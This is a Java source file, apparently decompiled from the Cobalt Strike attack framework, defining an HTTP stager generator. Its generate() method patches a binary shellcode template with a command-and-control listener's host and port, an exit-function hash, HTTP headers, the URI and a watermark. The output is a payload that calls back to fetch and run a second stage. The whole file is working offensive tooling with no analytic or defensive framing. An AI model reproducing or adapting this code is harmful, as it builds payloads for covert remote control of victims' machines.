package stagers;

import common.CommonUtils;
import common.Listener;
import common.MudgeSanity;
import common.Packer;

import java.io.IOException;
import java.io.InputStream;

public abstract class GenericHTTPStager
        extends GenericStager {
    public GenericHTTPStager(Listener l) {
        super(l);
    }

    public String getHeaders() {
        if (this.isForeign()) {
            return "User-Agent: " + this.getConfig().getUserAgent() + "\r\n";
        }
        return this.getConfig().getHTTPHeaders();
    }

    public int getStagePreamble() {
        if (this.isForeign()) {
            return 0;
        }
        return (int) this.getConfig().getHTTPStageOffset();
    }

    public abstract String getURI();

    public abstract int getExitOffset();

    public abstract int getPortOffset();

    public abstract int getSkipOffset();

    public abstract String getStagerFile();

    public boolean isForeign() {
        return this.getClass().getName().startsWith("stagers.Foreign");
    }

    @Override
    public byte[] generate() {
        try {
            String temp;
            InputStream in = CommonUtils.resource(this.getStagerFile());
            String x = CommonUtils.bString(CommonUtils.readAll(in));
            in.close();
            x = x + this.getListener().getHost() + '\u0000';
            Packer packer = new Packer();
            packer.little();
            packer.addShort(this.getListener().getPort());
            x = CommonUtils.replaceAt(x, CommonUtils.bString(packer.getBytes()), this.getPortOffset());
            packer = new Packer();
            packer.little();
            packer.addInt(1453503984);
            x = CommonUtils.replaceAt(x, CommonUtils.bString(packer.getBytes()), this.getExitOffset());
            packer = new Packer();
            packer.little();
            packer.addShort(this.getStagePreamble());
            x = CommonUtils.replaceAt(x, CommonUtils.bString(packer.getBytes()), this.getSkipOffset());
            if (CommonUtils.isin(CommonUtils.repeat("X", 303), x)) {
                temp = this.getConfig().pad(this.getHeaders() + '\u0000', 303);
                x = CommonUtils.replaceAt(x, temp, x.indexOf(CommonUtils.repeat("X", 127)));
            }
            int i = x.indexOf(CommonUtils.repeat("Y", 79));
            temp = this.getConfig().pad(this.getURI() + '\u0000', 79);
            x = CommonUtils.replaceAt(x, temp, i);
            return CommonUtils.toBytes(x + this.getConfig().getWatermark());
        } catch (IOException ioex) {
            MudgeSanity.logException("HttpStagerGeneric: " + this.getStagerFile(), ioex, false);
            return new byte[0];
        }
    }
}

